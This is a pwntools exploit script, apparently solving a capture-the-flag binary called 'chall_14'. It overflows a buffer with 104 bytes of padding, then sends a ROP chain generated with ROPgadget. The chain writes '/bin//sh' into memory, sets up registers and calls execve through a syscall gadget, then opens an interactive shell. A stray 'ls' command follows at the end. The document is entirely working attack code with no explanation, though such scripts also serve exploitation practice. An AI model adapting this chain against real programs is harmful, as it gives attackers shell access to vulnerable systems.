from pwn import *
process = process ("./chall_14")
elf = ELF("./chall_14") 

process.recv()
process.sendline()


#everything below besides padding was from ropgadget
from struct import pack

# Padding goes here
p = b''
p += (0x64 + 0x4)* b'A'


p += pack('<Q', 0x0000000000410263) # pop rsi ; ret
p += pack('<Q', 0x00000000006b90e0) # @ .data
p += pack('<Q', 0x00000000004158f4) # pop rax ; ret
p += b'/bin//sh'
p += pack('<Q', 0x000000000047f401) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000410263) # pop rsi ; ret
p += pack('<Q', 0x00000000006b90e8) # @ .data + 8
p += pack('<Q', 0x0000000000444e50) # xor rax, rax ; ret
p += pack('<Q', 0x000000000047f401) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000400696) # pop rdi ; ret
p += pack('<Q', 0x00000000006b90e0) # @ .data
p += pack('<Q', 0x0000000000410263) # pop rsi ; ret
p += pack('<Q', 0x00000000006b90e8) # @ .data + 8
p += pack('<Q', 0x0000000000449b15) # pop rdx ; ret
p += pack('<Q', 0x00000000006b90e8) # @ .data + 8
p += pack('<Q', 0x0000000000444e50) # xor rax, rax ; ret
p += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
p += pack('<Q', 0x000000000040120c) # syscall

process.sendline(p)
process.interactive()
ls